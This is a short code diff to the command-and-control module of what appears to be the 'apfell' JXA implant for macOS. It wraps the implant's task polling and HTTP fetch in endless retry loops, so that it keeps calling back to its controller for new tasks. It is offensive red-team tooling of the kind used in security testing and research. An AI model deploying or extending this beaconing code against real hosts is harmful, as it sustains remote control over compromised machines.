@@ -24,9 +24,17 @@ class customC2 extends baseC2{
 	}
 	getTasking(){
 		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
-		var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
-		var task = this.htmlGetData(url);
-		return JSON.parse(task);
+		while(true){
+		    try{
+		        var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
+		        var task = this.htmlGetData(url);
+		        return JSON.parse(task);
+		    }
+		    catch(error){
+		        $.NSThread.sleepForTimeInterval(C2.interval);  // don't spin out crazy if the connection fails
+		    }
+		}
+
 	}
 	postResponse(urlEnding, data){
 		//depending on the amount of data we're sending, we might need to chunk it
@@ -88,7 +96,15 @@ class customC2 extends baseC2{
 		}
 	}
 	htmlGetData(url){
-		return ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
+	    while(true){
+	        try{
+	            var data = ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
+	            return data;
+	        }
+	        catch(error){
+	            $.NSThread.sleepForTimeInterval(C2.interval); //wait timeout seconds and try again
+	        }
+	    }
 	}
 }
 //------------- INSTANTIATE OUR C2 CLASS HERE -----------------------
